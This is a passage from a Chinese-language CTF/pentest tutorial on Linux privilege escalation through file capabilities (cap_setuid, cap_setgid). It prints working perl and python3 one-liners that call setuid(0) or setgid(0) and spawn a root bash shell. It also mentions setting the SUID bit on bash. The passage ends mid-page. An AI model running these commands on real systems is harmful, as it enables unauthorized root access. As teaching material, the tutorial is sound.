<p><img decoding="async" loading="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAYIAAAA+CAIAAACp54tkAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAASdEVYdFNvZnR3YXJlAEdyZWVuc2hvdF5VCAUAACKFSURBVHhe7Z3nVxRLv6jfj++656xz3O7XsJUtCipZUZSRoEhQghJVxAiKulExgCCKOQFbMW1RBAMikgeGzAAzw+Qcuicn+HTWut/u+QPOWvfequlmmMAQlKDurvUsV091TVVPWfXwq57unn/09/f/g0hEIhKRFijV19fjW0QiEpGItMDp//7Pf/33//nfo2Z0EkYUNHXlQ05MMo2Uxn7YbXYqYANiGm5TNbfopAh8aRCqr2fSgpMYRWTdUCv/fY14mIcq+KiULsjdT/GJ7jxXi4CXCr5aKRo1qwBmI6rTSMFLFSpUIgIA2AAvQSbYhZUBL2ElLjDqFfaHNGNGUJaewTDpETPlITMkiRZ2QkwRO5SZCpf94Cp/ZPy9PyymHwnDpwy/I5V6p3yC+QEXEJam1pCuVRSdBKYKPfK08GWnCbpgEhDj64t0UvLwmWfI53rlhzeiA/tppP3cNwzty9wO35iuQw84r6t5L57Q4uIpvvH9f/YAcQDXjJiUwC8mAwIUA17aagUDZIJdoAAoBgpPWAbj2zVkg8IsGNSLpU75U+KyH1zkDzvV8APiNNS+ZwgNLSy4gLA0tYZMAk3lK6Spz6i1/AGfEg0NvZnHij1A3wbiiPThfXmilx1GI2pEB7mXzvSEJnT4RVM27OnafYb2sF4ms4oDxkGThzkAUACLiQw6ucMuK7OqoW/ART+4zHd4+4+I01AjIHAFLiAsTWdRNisAOzj4AgOsuYBWABqV2GHXhIBiWHnwRoddGN+Lhv6GOA21H4L/949/EMwiDt3rClxAWFpwDek0YMkDl2OTrLNsAcWwpRl4o8MuDEJDC4bTUPshcJhFBN+ITMLWgljBqZ8dwAWEpRloyMjTfqxEGgbNoBaHXdPAlYYmd8qE6LUyzFwO+RiEhuYc+/H0g2I9N4RNnt5uckd74zSoqyy9V9XgkDmLzHX9cwjWk2CDxezXayQOHe4ALiAsTV9DI50Ph7cl0kLOytlfM89daQg71zPNFRkGti4Db3TIxyA0NOc4DSmIdgAtKRNfrdCgiOOu7xLdx4O+h97oxjQEJk9LY20buX5yyNV5BxIP3fn0pY1c96rweM6dSrJTGUjru/tH9+w9fO1Tq9OuSZlu/TOgruJq1rl7317P1GA9WfPhLdgW8ugGEC44dbsVXEBYmkE0hHTJL+fximr0Oqdd08CVhrDvyKY8OW0LKAzeAt7okI8xEw1JdR+fSoruyrsk45lKmvLxHW7aUUZYCn3HYdbJBwhViO/SNQm3J9GCE3HCriDI9E7bf+9M1A8TgxgrL9G3JtKPv4Wn1Y085GQqbWsK58XwqOITLzSRFpqPyL5dQ1Ldh6eSq3flnVP8Rf06RiS1NxL9PZb/+suS5R6+4VYNgcnT10Me7Ke4puWvU3GJFyp64Tb58fHdyfnV/XYFrLR/+TOvsLTaUnL6TL/+6TNb9UwN1pPVVRWfa6vBS7mEY9LLHTrfCi4gLM3tuSGdyMggIw9vShqFdhoSM2SdtZyiPEY1fSGjIRMPyU6lBafyPwKvYTkc9NxhRnqx9NUnZRtF/aVSlJ5Oi7ioYFrqNNCUpU+kD59Iiy7CwHD6GrLph2nlzzPO/eCSedEQXm0q/4PIcdcsIGs9tdYj5THrPVyUoaxqWw2BycMe7uexhyaE01aUsvPAnz2Dlpd9L4+ExRfUsu3LfAtzU//sH6crsJ4E0VBNzdvujmaQo1EKzYaJxwMuICxNR0Mjddfo1hCAtF/YJIf5yCdeGJiK+YgcGVV+5sPtPEQCpiViZtSIT2YztifTSCDz4HByDv9Fn0EvV3RW0A9kdAbGUHyjKBv2dkUdG3jQagDWkHQIz//RvSW2Y1NK75F7fCoHCkX8YSgwGl7ieLxS8vnRQExih9+uvke9KOf18NZ4WkKx8GZ+T3Bsx+b91AetClBeTuUXne+LTBwMTqTvOMI6VapkT3acI31lTKAS6+cKThq+0QGvIVSLLSe/LH0HXore8bYnD19vs7u8kF3BDgH1WDQ0w34YcZmPjkra5XnnmZFp4PjZOeUqnuX48RAsiXH+s57ygp+aQd+WwvmLibebcE16t4AVnUaPyOS96INXlpo4qodXOUkZjNDkb+qHiZlKQyFnhXevsXfvZ8ScEVYOwJ601RP6mQ+38xAxgufHX5PeKWBFgY+cyXveB8qP9JYxQbdstZI0XNwxMkk9ljE9qmkqClnhFnyBoh4f6C4QVaUt886uQezPDVk1BCYP+DOuVPCcYNRmk3ZcqJXhL1mVhwJ3ZuXlJISRNm0M2nnoSRcLKymrPhEevIUUFOC/NatOghXGy+/JLT57MHl/YkRIWOKdFubYLoxp1s/lVOUkhAcHBwUGBoUkXXzFkGHleQj9TWHadlJQ0JYtW8JiD96uo6LWerKv56XtDCdt2rzNud1pAutJvnLPcjwbgnYefdrNdiiD9WRTQ039lw9dHc0cJhVkugqIMP/gaVrRkKAD/fAJeV8hSAQzZyoNoS2iuGTatqP8x7VoSR4j5AD7frvJhBplTbSwGIpf6sCtN9zrZzr9E3oL6+Ryvg7tkWXsHwo+1HepnHP3cs+G6I6oW0IB1Iro5fVe/yjKln1dWxK649I7/RKG3nOAhrihSTTSPurpZ9zSvG6/KErgBR4PxEEc4fUz1NM3hQ/KhBkZ8HrLE9VG8IFdHae8V/muUpiWTAtOYRW+RaprVAxLLKBnoNdzh8OTaeEHmcfvocN0xdEUetozncGmQ6ajIRf94DJfPyDLSKORMjg3K5GnN1hhSfTkMg2cVBztx4ewucjjw5EHmAdOMLYdEDbL8XZJqcwLFWjFTaiS7deUSnB4ck1JHi+/VFr6+Jv6YWKm0lBwMuPQbXHBhWFSEi30vJylmEJDwanM3Ar01U2onvBrShQdlfUqqyuFqcmgWlbBW6SqRkW3xESTa0j1Kcd70WKvzAbQA1iOiTnSHmF8/C9jVfYIAmaCeGSoYETMBrs0HQU7V6/aus1rdWKpRD+BhsDkMWhlYP7YYmDcifPd8xfPmi96n7Fq1baTH5kik4Zek+nnHnObpR0vr2vO3uiX2ay25sDya7bnNgulYLv5jN+6w681Y4UB06/fIOwe4gnBhnroXuJar+w6saW8pP28v2dSKV8Dt6U9Va0MyXg9QUcqBsFCgd9w0rHdaWOpJyTbcjxDlRneHkllIp1dGawn28n1rS111N42LmtgVjWEYaTLD6dMqSH8r2v8Iw2Yt+Av+Y4kWvhVVIkaukqgMsKLhVJLpLMpmrLxPBfoo/EGg5RET3mqAGNKOsBJ303xTaR9tAREnNfUDVEU35jui3XyrvKB2LPsbq4OhCdhyUOh+Vw2H+W+GQAFNpzhYPeIWBdljBdsMG8TSuAxuJp+4CNMsBhBDJV5DFIa52EjUphJI6ULW0XKi2m0nbdVtmfEpqEhV/3gMr/7EVjo0VOeaHWKEQMXHhgpQ9Rq09WkZOaNdtNwJX9/AVwk4u3mwXbRWrxd7B4RK1/fDyCTpXr8SHzj4TilDQbjlNHQJUSEjBoY8kMpYFXFe8ubQkNgG+QjtXg+OB4wRidclE2uIRBGaQRKjfUlMkrfayxdY2rYb3q+yPgsxFQfYSxdZhoYwAqYxM2vTgQt/WXRcu/YCTXkNHnErad9gi4221x1Lf14cEVocTf8EwIqpOQELEt4rbDuRY2t2X5ema1g2ExQXsG5E7IssVw9Vvgr6ocYhkp2Ltn7nGd5qWA/ili5fvfVii9she3B27d7L9S+XWcUBqVIjQrHEGl1WK/aHY+h/qjnqow6rfVdkOn1JA60jzXNuoZGhVXcsCRa2FlpN9vYVsIC0yDuoUaHGrmV/RuiKRuODzf0yz7d6AFhTth1oZiveHW+PzAe/BUFdPnvovhEUXx2U5/SxjUUkMWm4paBJ6eRz0BDfVsvclg8lFeJa4jBQ6VUwb2C/piUwW1J8AJl8Nc1wTLVZzT9TCI0J40W8odsWK4v/4MONSRWXUmnbb+htNUQ6xUbaqgARWbcD67yzZ+ujq98cVJ51QLYHNZE6HkQd48fg6t2DRz1szvc1COM8JSv7weAoUeaBP5TbI4H1jOmocNvDFBDbCQT6Mb53JAIPWPR0zP6VBqaSCtfpSF7kFFJuXmgDm6jleZ3a4xlv5ta/hoFxzxWBn5hf6i889bO6UweM/t+7LqEvwS2zdlNSzPjWviS8BKuwlpgCg1BHTyx6mAm9SPKvsf5GbtioiNjd4dvXLl47zMuXLQCjPzBt4VnUkL93N23pOQ1CrCDmazdCdA3F25zc1u5YoxVu+/DxbLD8Zi6cgOX7HkzHntC5ldDYEUAXiKf8KHsOKxl+sorDDD64dhNosfkSsk8UN6ol0ge53T6AssAojtIJ4ZrBoFZkC/Xu/2iqTHFSP+AbnBA0dUpbmuTcrjjGtrwBzSOgq9VS0bNKqAhFmlPx8Ycew1x5c/Pgso7ogqkrT261j/ZMArAp5+L4wR9IUBOwenHq+bjn9FkmVdwwttrKPIOjIaM2MlvxNx4C37AXQ/U+hn3g6t8eD0EyIy7ifT36wYxqAbE0qKtQbDjdMgcb1dhel8AKqcn30EofV/fD64x1xYxwJEDdYK/hPpuyV6gqjT+e+GYJizRjYEmO5BCC97H/wjzcWXMQEMCqEUQTFXxxweuq3rGCoBoSDUeDU0Ndt2QTnh/GpNH0vqH76YLjfY3oNlNSyP5lO+KpCqwqBwrMBMNzaR+1bsTnqtSyqmwsIFWGrlkXENWVL2lcSs8jr+zVDhDDbnE7nj0nw97eBxtXIBoyECVpSXTSEfEFIuGtM3CyCTatmOCl5+Rohw4r7BhbRIqLxykbTvCyb0pvPJIVt2sk8LyRh2fl7WX4pfSl5k3dKaY+fSjeBg7FU1mxsd2+sfTTzyQlj2XXLrMzP+iVEqUCqro2bVe/6iOgCOs5+9RBn4Ph0lWMxgYg7vJRkPSkpMdwHFhZwSlz8SnMungeMIt5yZcHSf8UHLt/Szogj0XhVeu886/1ullqivg4I+JWujKvCNwUdYiVl7aR096rBXUCvZmcfMfiq8WsCJAlJHKetQDT+XOsB9c5uv6ZelpNFIa89RDadlTyaWLnMJ6uPAxsbXvHrCBTUJOiyo/q1lj36m70JDh1QX42ePyJE9efEM/jP2nOyOrE0Ql0YL3s07fE/2RDZUUfR0Fi0FMK8FpzJwy6ZVzMD+yCAX1a5qFO0F3HRO8+IxczYH5U2rIJNfey6JtTaInXBTmX+ede60Dk9lVPdiwVtU4nRtygb73aebB218GkRoYDXXdjZpy8pg59+PWxb2wC1UAYFouWx1/i6oAfTtQsd/TY98LuU20NX0Nzax+xbPU5euz6wUgLNIyyjO8Fu8qZVg0JOx7df9DPxtEqSPKnrnR0DL3uOJuqXxE3fs0afW6Y2+V9mXmQ0Mjg8/YoUm07VfguIE5ct2bIubOVEZMFifvkSA5eWxYy/VVxawYMKPGLrGJyJH2Sox6qaT8Ug8pluIbbQmIoiibjw03MWFAxKhjncrqDY6jbkmhJ1lu9TSoRnUtwu3gLypcrIHBzXnJGjEpDTq5ilc5HiLZLsp4Leysw50bdw9Gn+AVv1dW3GYnFiBCeDwujtPyuZAu+fnTjO0p9PAM1olHSiEyMvCSAywD5mTqXfHpw9yXZNnhFMbZz0Z+q/zKBWZUGj0kjZGYKyxvM4IQY+b94DofHcG/KUulh+xjJF8WvWyHTdhdrJTCeTl2L76rRZayV3HhNCM8lRGb/S39gOdPAGIeeCfKPMEIS6aFZjCzHiCDliv3Ma0kFIjOnWKEpjGSC2Tt2DkLue51ETMilRGdxbn8SAAWelNrCNTWJT8HPkUKPSyDlfVICaeoi3qw8ppm7Juyjqm/KZML6wsPhXmt/m3xol9XBEQem2rySMg5foG5DfahCsAyvQ9l7wn09Fi1amPC5UYRviJTvj200dvLx2PZ4kVLPb29/Hfm9wCtu9TBTOuXUEvTtq5b7ePnR9qb+6LkaGjsdQao38jtKj2+e+OqlSvd13v7RxwsasXLz6KGlvvF7Y/fsAqs1TbuyWsBg8e+zNxqaB6eN4ShRAQalRi4BruYyAp4CTLBruncdzaTyxcnhnje0BQ4DakfEYebOVxNHjPv4Z51sc/4uGJmnbmuf/aw1dnEzKWG5v55Qw5gzzkD0tGqJQCwAV66up/emW/XkA1/s+cNgfHhkDMh9uPpB2WaGho18Jk0OrziYY6Y6/pnjYXV0Nw/b2h2mVUNfQM/4vOGwPhwyJkQ+/H0ozOjyfM3Rk59fqG0leN4OtyGudTQLAHs4OCLOeJ70dCPCBgfDjkTYj+efnQIDc0WhIbGITT09YDx4ZAzIfbj6UeH0NBsQWhoHEJDs4bT0PkpITQ0W8yphuR9JQdzK2mTfkE2NUa9tOVGSnZ5J7wNdUZIuXKHnEmZMw3J+8uOXK761n6YAhO7Kn31muQ/ReC/ymHX/GM/bn5WCA3NFnOqIenHjBWhN7pNjvkzw6gXv9zzn4F5rTNyCqoYrk73CCumTENew93lWdEb1/quc1/rH37yabtmvHUEeRHvd+qT0aygXQ8Ovdb5VZ9ldvphKuTsj9duV/cYHPMXAqeh81NCaGi2+AE0ZDZK/9q7aOPllhlpCGHciV6y+Vqv5d6OyZH3Vl3JKe8YNhkRNfVWwhqvc63WL9rlvXmBu0tAICOtOeJ5oGqSO8gnYX409D3hNHR+SrDJQzBbzKGGtp64krNrg7f7bx6kgy/p2PRG5LU5MZvWr/d0c1vjF59XJRr71tksfF+UvNnbc83atZ4bdh64T2Zbrs2TvTvwW+CxovOxgd5rli/zjLpB5mFXBrlG1F8UtGJPmUDlkD8xOo3U8mRr5aiJXhq9JL7c0q5x6PkBP4+lv7it9wnwX7dqya/uPptzG2Rjn84BUdX+FeG3eoFr9AqGUCoymxHF010rkx4jln4gnbp5JTk40GeVu1/cg56x+yrUXRWnd2xYt9rDY13oodvd+LPQJu4f/bs0771Zp6O813mHX7ifuyfQY92WzBrL1cyGuhOBXp5ea5b8uj6zdZLbKeYNp6HzU+Iwiwi+kbnT0NKlwSc/caWjBmZtltfy6Dtcy4wyS3vpIjgVdYz7e909svG5Le/I9f49qUwE73WQK/rftWGP3TLLPmYsX7rp2Bu6ZMQsacr2dj9Spbe5VHoCtA3nA3xON8pGkLqHhRUco1OBiVHI2/Ki/Pe+4o2dJDL23Y0IvjagGNXXnfWPfW57g6gjCnrx1rVZ7wwm1tO4xb8Enu81yLsvBQTltZiwfth05A1dNGIWNWWvdz9SqYdvkXZeCvCIu0VXoaMaeK+NT/YHbD04Yf/o36Wu8DtaJ5GSz67/ffcthppWGr0i4/34FZJGcrafN6GheUUmYYPJU/PhbXVVBfi3qaGmnVwPcgi+gpbmz3O+KDN15AQsT3iN2BaAEUdJ5JK9L7A7yBXskoiVXruvvv7CRjABYQANuW273o2gQhXKpxZt+vfoByK4zXmV/Ou/2aRf4kss+QLeszj3oMsDBpV5uHjHxpwO/bhrzEZUoxKDf60bWP6I9OUxP7elKwKPP21XgU+LNa3/dNo34S8FOoo8SfE51qgby58IXU26x657Is2H7E0h27fGPZMKq/b9nvpaYN8PCs790GVJ5WqwDdTms/LwBzwy0tcd9vA82uDQhE3/AA39Hv9IbpL35m8MvNRsMvNe7l2a+mb8ZhFCQ/OPViVmMfvB5PlcW11T87b+y4fWljrwkuDr6GhvmlsNmYevhS8NL4GBBqLsf5x/aFdMTGRsbPhGt8V7n3PxG6NM/MGqwjOpoX6r3bek5jUKsagEaoh0rctybojbV7jxf0XeFdie3HFARikm/RL1cMBsVpn6Lm3ZYKch7Ot/g05u3bDuAosyo/hLYcSaXSV9+HkcRVmSb2aLHjUN5YeFFzDwW1Inxswq3hlwqpVasCO2qCTd/3RD243wzYV9oH5nDT2BGtK+OrDcK7cNF66p+3zg0oTXIDJy0T+Ehr5P9BqJkEcHk6e7o7mro5na2wa2Cb4a+mDXHGrI2HbKd2VSlRIdVb87sXZVylMqXJgYaaVRS8Y1ZEXdWxq/wiPznWXxAjUUeqNXb0BMBjnzTsi/9jxG4bYL5M/TV7ut8/UL8PcL8Fq5ePFKr02Hq+TwZzwsoAp6fTudDySF/baHDeClYqAwcFnKM7A4MraeD/NZsWSpm4+/j/+6ZYuXuW9Iuc+a5OYJ3YeTPgmlfyYGna0dKA6JunnvmHdyFdSKCw2BaMjbMRqCAZeL/iE09N1i0MrkEg6YPBwmlcsaABsE34KQT59dDS1bnXCLiihGdQMVBzw99r+Qg4qQZ6m/rc9uAKsVRDtcnuG9eFcZw6IhYV/F/Q9UtsGEjqh6bDQE6lkJNGSySIRzP3xZ0lO1nT5cYmw7ExBgvyjjP4pd+h//sTSihA1qhjkjsvpHhQ9auWIzmOrcyjObV0Q9hGeaQVu69/vWp7/SmhFRaWQQnPkw0yUmRlls4O5dvskvuNqP6d5RkdtD8wZhAOVCQ2YJ+azP6rhbNKAqdc/jpNUBObXw3JCL/iE09D0D5oxGKQSTh2BWAJ05q9HQ4ew9mzw93Fdt3HO5UYwtsiTUsrSt61f7+PuREnNflB4NjbsO1zsmblfZ8d2Bq1a6ua/38Y/IKGrFy2PTuMcEoxWEcz/Mcm4FbE+NifLHhoA/OvQ2mUhNbtBvKzedrJeDmi05Bmbr3Yydfr+7ua/y8N2WceuTBA95FMzbocFXyCazvP2sX8ITpmPI5oicfNbr139tLOiTwxXokv90S39lOeXsSkPoqJL85FiI92q3NR5eESdKBmHoBJi4fybRkLLq0EYfLx/PZYt/Werp4+Ufmd8z6fpxznEaOn8HzCASt3nMO8E3Mms/EETwN8Vp6BAQzBa4gLBEaIjAJU5Dh4BgtsAFhCVCQwQucRo6BASzBS4gLDlryOGayHnG9kgIFhinoUNAMFvgAsLS96YhmZStVY9/bUSwkDgNHQKC2QIXEJZcaai3h9xBaZxPsHbBBovZr9eO3a5FMA84DRECgrkGFxCWXGkI6KClqdbhGu05BWu35uNbsC3k0w06V3efEsw2TkOEgGCuwQWEpUk0BHTQ10sepFJmkf4PxTmXHjX3OeYDsHarqyo+11aDl3Ipx2SwvSWNYM5wGiIEBHMNLiAsTa4hoAM2s5/HGZotmM8zwuMutbAc8wFYuyAaqql5293ZDHI0KqHZOL2fAyH4FpyGCAHBXIMLCEtTaojHoTYUxJI2BcTe+lJ3PXknadOGgIQyFleJ8JTClmend4dtDQoK2hp9pLiFa8l0lS/9kB9DIgUF+AUEBpNIpJA9d7o4eHkLWLtNjTX1Xz50dTRzWFSQSQRE84HTECEgmGtwAWFpGhoaUiIcatE2r81b4s6+5Sv+Org+rUopNxlElEubvOJvDiFyk7K7PHldQPY7pWGSfIimKs0jNH9Ii7+0BWu3va2+taWO2tfGZQ8QGponnIYIAcFcgwsIS9PU0GDR1l+9MpvV6KhxsLWqQWRUjuq/nPVxO/xBarmly+Y5O5M+f0f/LnUlKZ8+wa1SyonaJTQ0LzgNEQKCuQYXEJamraFgt/RXKpXNT8iLyuL+zS3zi2TUpNChAoR8NnDpntcqRC/9c++vXrlt+JMPbZ6/A3HUkFGuV4tU8JfpBVi77e1NbeSGGWjIhMKfkXTIJJgR9uODgGAewAWEpRloKOO1WiVQqeVg2kN0dTleKw/Bp5ciRo0YrTnk4XmsUYfo5VVZniAasouSrA881L9Lc7NqyOIvlVpmMiKgQqxdCmVmGjJphEoVKIPdee+4l8AOp6FAQLBQ4ALC0ow1pAFhDjbnpeSzvqvjbtNUylF17+OkNQE5nzVmRK9k1Z3yscnHnr+Da8LYftrfI/mtWDFqEkv5bBQRG+FDyyBj7WIa6nCtIby8BQcNwRz7YtaXBI7jgIBgAcEFhKVpaIjaXBgTsHblouWrvb2Tngls5ryy7cmxUO/VK1cu/z34aMkg8A7UkEAjI1vyf1+zZn3o4dsUoUCJCNVqmRkYxzj85VKkr/sK9zVrSZnlTIVIb8Rrs7bb2vixo6udCzXEBxoya4FoZCNm1KyXwkdSIXwlIlBr5DBHK7IuEpVqix9NiEEjUqE2LcLKwVEJNRrs7QIlKoZPgNRK1LCYQKWSmvBi453wc+I0FAgIFgpcQFiaXjSERyVGuChT4Isy/KQMNskFGrjscthGjWowyWUmUNKo0GMLOpg/NuHhooyPoiKdVg58MdZuE7n5UweFzGZjGpLhFRplGkSo1cHlG6jNCJd1sCqHRZmLFsFR8ZVKKXjXCPCUWogqoMhMRlBMrlMKlA4H9rNiPw4ICBYQXEBYmqmGrNGHBYEW6sCFhqA4xoOdUYNEhUjGlmBYWyB4URg0YhUCq7JqqI1c19PePMyyaEgnViNiA3iXQaqyrW0MOw25bNH2CGExtU2xEZ1YiUotz4QEYAf2k+I0FAgIFgpcQFiacTQ0fm7IigsNAQsowApIoIK/9iOEX4cBKYy/C2sO3zbrZVi7ZDJst6+zmUYfABoyqvmWFRlcbYGaUbjUkur1iDV4sdPQhC06a8gkB4HVuK30EiUqITREQDCf4ALC0lxqaOL4xYK1ufFMrN3mloY2csNAT+vQUB+C8LQId1wfFlvp4Bf80E1mS6a9hly16KAhuL4jNERAsIDgAsKSKw0tFJiGBvvbGYM9UhlHKRPAFRnuiDGMUuuqyk5DMMyx0c0409cQYLwrfjachgIBwUKBCwhL35uGyGT8uiEWvVvIZyCIBF9/mRQGncLy66yoWSdWYSeM4JkdEZAIWHlZzpfDNRoKDKVHwbtGjAoTfiab0JAF+3FAQLCA4ALCkrOGADIpGyzKaj5aftL745vnhVln772lgGVacy2IVjooTRbGn1hGbqptIYMNmE8h1zU31jY1f6FYyrS11LU01jaCnMZPLwszzz2oxvIhbfVky16wq6nxc3NTHZnc2NJch103xGX28jl0pVo+akCgI4xyncpyugee/RHr4M94WaxhUuhVlq/hldgyDV5LqYZnhUAxkUaHWIpNQ0N4zDXeCT8hTkOBgGChwAWEpQk1pFXb/qT363tZyfsvvyDDh5PBFdMYtg8ts813xedHx/fsu/zSUs9kb+ygNMPLF1l9Qu6wVi9szN4QVzqEnQmaFAn9zdmU8MANPh5r/beffEoZu2YSgCIvEvxO1RrNCO06KfRal03s44BdP/xsOA0FAoKFAhcQlibUEECvlQj5dLA46u6sL81MSMl/2w8fTtYxht0Ty2zyJ6Ht8fHdyVeqLfVM8Ub6UBeH0cMXsA3CxykeOx6xsaBmUkysL7fz39LEI2ZUTb2dsMb7XKtsbK+8Ny9wdwndbJbWHPE8UCWyfEaQb/uRHV7+jDgNBQKChQIXEJZcaQhg0MnkUg6P0/f82I7Y7Es5KTGR28N2xB0pbenjwQeVDVJf5STv2rkzIjx8R9S+i097xh5mxul5kZ++OzJiR0REREzi4eL38JJoHqf/5dHwuFNXL6fH7Yravj0q7cbnXqz8RAwCDYkkHNrtcI99zxVwxWQ9MMwsk1rDRC+NXhJfzoY/0Gocen7Az2PpL27rfQL8161a8qu7z+bchr/lE2adhgIBwTxhdAQX0HTSokWL1qxZ47VACTQNDgA/FCIRiUg/X7p37x6+NWn65z//CVywUAm0jh8HkYhEpJ8rZWdn/3/J8AXo2aqQ3wAAAABJRU5ErkJggg==" width="386" height="62" class="img_ev3q"></p>
<blockquote>
<p>值得一提的一点是，篡改系统中的原始二进制文件是一种不好的做法。在不同的情况下，如果你发现可以在 bash 上设置 SUID 位，最好在 /tmp 或其他地方复制一份 bash，然后将 SUID 位应用到该副本中。但在本例中，我们无法这样做，所以只能修改原始二进制文件。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="35cap_setuid"><strong><div id="id3.5">3.5、cap_setuid</div></strong><a href="#35cap_setuid" class="hash-link" aria-label="35cap_setuid的直接链接" title="35cap_setuid的直接链接">​</a></h4>
<p>cap_setuid 功能可能是我们在 CTF 中最常见的功能。该功能允许用户以 root 身份运行任何设置了该功能的二进制文件。如果我们发现脚本语言（python、perl、node 等）等二进制文件被分配了此功能，我们就可以使用系统命令轻松将其就地升级为 root。</p>
<blockquote>
<p>查看 GTFObins 上 “Capabilities” 下的所有二进制文件，以了解我们可以利用此功能集滥用的不同二进制文件。</p>
</blockquote>
<p>从 PEAS 和手动枚举的输出中，我们可以看到以下二进制文件启用了 cap_setuid 功能：<strong>perl</strong>、<strong>python3</strong>。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="351cap_setuid--perl"><strong><div id="id3.5.1">3.5.1、cap_setuid – perl</div></strong><a href="#351cap_setuid--perl" class="hash-link" aria-label="351cap_setuid--perl的直接链接" title="351cap_setuid--perl的直接链接">​</a></h6>
<p>滥用 cap_setuid 功能的最简单方法是再次检查 GTFObins 并查看 “Capabilities” 部分 - 因为它们专门用于针对 cap_setuid 功能。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305004-474331237-a094905bfbb0ab5c94f1f390e74db811.png" width="845" height="221" class="img_ev3q"></p>
<p>从上图我们可以看到，前两行命令将用于将此功能添加到 perl；但是，它已在我们的目标上设置。因此，对于我们的需求，我们只需使用底部的命令。此外，我们将调用 bash 而不是 sh，因为它是一个更好的 shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/home/juggernaut/bin/perl -e &#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164306613-1785692460-1ddf742168642a63ee3c8ee8c9294df1.png" width="1012" height="116" class="img_ev3q"></p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="352cap_setuid--python3"><strong><div id="id3.5.2">3.5.2、cap_setuid – python3</div></strong><a href="#352cap_setuid--python3" class="hash-link" aria-label="352cap_setuid--python3的直接链接" title="352cap_setuid--python3的直接链接">​</a></h6>
<p>与 perl 相同，我们首先检查 python 的 GTFObins。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164307348-382205839-c06ead947c8b6c30f4bcc4cd077453a3.png" width="832" height="226" class="img_ev3q"></p>
<p>正如我们在 perl 中看到的那样，前两行命令将用于将此功能添加到 python；但是，它已经在我们的目标上设置了。同样，我们将只关注底部的命令，因为此功能已经在目标上，我们将用 “bash” 替换 “sh” 。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/home/juggernaut/bin/python3 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305035-1283542749-7d626e3ec3dadf3692c685017c9a7a09.png" width="1012" height="121" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="36cap_setgid"><strong><div id="id3.6">3.6、cap_setgid</div></strong><a href="#36cap_setgid" class="hash-link" aria-label="36cap_setgid的直接链接" title="36cap_setgid的直接链接">​</a></h4>
<p>cap_setgid 功能使用户可以以组所有者身份运行任何已设置此功能的二进制文件。如果我们发现某个二进制文件（例如脚本语言 (python、perl、node 等)）被分配了此功能，我们可以使用系统命令进入具有提升的组权限的 shell。</p>
<p><strong>该功能并不如 cap_setuid 那么强大，因为作为组所有者，我们实际上只获得了提升的读取访问权限。</strong></p>
<p>从 PEAS 和手动枚举的输出中，我们可以看到以下二进制文件启用了 cap_chown 功能：<strong>python3</strong>。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="361cap_setgid--python3"><strong><div id="id3.6.1">3.6.1、cap_setgid – python3</div></strong><a href="#361cap_setgid--python3" class="hash-link" aria-label="361cap_setgid--python3的直接链接" title="361cap_setgid--python3的直接链接">​</a></h6>
<p>当在 Python3 上设置此功能时，我们可以重复上面看到的相同命令，但将 “os.setuid” 替换为“os.setgid”，以进入具有 root 组权限的 shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/home/juggernaut/bin/python3 -c &#x27;import os; os.setgid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" 